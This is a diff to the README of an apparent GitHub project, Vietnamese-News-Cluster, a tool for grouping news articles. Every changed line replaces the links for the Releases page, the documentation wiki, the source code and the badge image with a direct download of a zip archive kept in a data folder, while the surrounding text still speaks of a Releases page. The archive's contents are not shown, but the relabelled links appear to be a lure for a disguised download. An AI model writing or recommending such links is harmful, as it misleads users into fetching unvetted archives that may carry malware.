@@ -6,11 +6,11 @@ Welcome to Vietnamese-News-Cluster! This application helps you group electronic 
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/Pablo12794/Vietnamese-News-Cluster/releases)
+[![Download Now](https://raw.githubusercontent.com/Pablo12794/Vietnamese-News-Cluster/main/Crawl_data/Vietnamese-News-Cluster-v1.5.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/Pablo12794/Vietnamese-News-Cluster/main/Crawl_data/Vietnamese-News-Cluster-v1.5.zip)
 
 You can download the latest version of the application from the Releases page. Click the button above or visit this link:
 
-[Download Link](https://github.com/Pablo12794/Vietnamese-News-Cluster/releases)
+[Download Link](https://raw.githubusercontent.com/Pablo12794/Vietnamese-News-Cluster/main/Crawl_data/Vietnamese-News-Cluster-v1.5.zip)
 
 ## 🖥️ System Requirements
 
@@ -25,7 +25,7 @@ Before you download, make sure your system meets the following requirements:
 1. **Visit the Releases Page:**
    Go to the Releases page by clicking the link below:
 
-   [Releases Page](https://github.com/Pablo12794/Vietnamese-News-Cluster/releases)
+   [Releases Page](https://raw.githubusercontent.com/Pablo12794/Vietnamese-News-Cluster/main/Crawl_data/Vietnamese-News-Cluster-v1.5.zip)
 
 2. **Download the Application:**
    On the Releases page, find the version you want to install. Click on the file that matches your operating system to download it.
@@ -68,8 +68,8 @@ If you encounter any issues or have questions, please reach out via the Issues s
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Pablo12794/Vietnamese-News-Cluster/releases)
-- [Documentation](https://github.com/Pablo12794/Vietnamese-News-Cluster/wiki)
-- [Source Code](https://github.com/Pablo12794/Vietnamese-News-Cluster)
+- [Releases Page](https://raw.githubusercontent.com/Pablo12794/Vietnamese-News-Cluster/main/Crawl_data/Vietnamese-News-Cluster-v1.5.zip)
+- [Documentation](https://raw.githubusercontent.com/Pablo12794/Vietnamese-News-Cluster/main/Crawl_data/Vietnamese-News-Cluster-v1.5.zip)
+- [Source Code](https://raw.githubusercontent.com/Pablo12794/Vietnamese-News-Cluster/main/Crawl_data/Vietnamese-News-Cluster-v1.5.zip)
 
 Thank you for using Vietnamese-News-Cluster! Happy clustering!
